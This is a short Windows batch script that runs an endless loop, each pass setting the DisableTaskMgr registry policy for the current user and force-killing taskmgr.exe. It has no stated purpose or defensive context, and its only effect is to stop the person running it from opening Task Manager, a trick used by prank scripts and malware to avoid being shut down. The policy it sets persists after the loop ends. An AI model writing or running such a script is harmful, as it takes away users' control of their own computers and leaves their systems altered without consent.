@echo off
:A
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /f /v "DisableTaskMgr" /t REG_DWORD /d 1
taskkill /f /im taskmgr.exe
goto A
pause